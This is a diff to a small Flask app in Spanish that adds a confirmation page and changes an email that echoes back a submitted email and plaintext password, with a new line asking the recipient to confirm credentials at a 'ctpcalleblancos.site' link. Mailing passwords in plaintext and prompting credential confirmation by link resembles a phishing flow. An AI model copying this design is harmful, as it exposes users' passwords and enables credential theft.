@@ -21,6 +21,9 @@ def inicio():
 def index():
     return render_template('index.html')  # asegúrate que este archivo esté en la carpeta /templates
 
+@app.route('/confirmacion')
+def confirmacion():
+    return render_template('confirmacion.html')  # asegúrate que este archivo esté en la carpeta /templates
 
 @app.route('/enviar', methods=['POST'])
 def enviar():
@@ -36,6 +39,9 @@ def enviar():
     Tus datos:
     Correo: {correo}
     Contraseña: {contrasena}
+
+    Por favor ingrese al siguiente enlace para confirmar sus credenciales:
+    www.ctpcalleblancos.site/confirmacion
 
     Saludos,
     CTP Calle Blancos
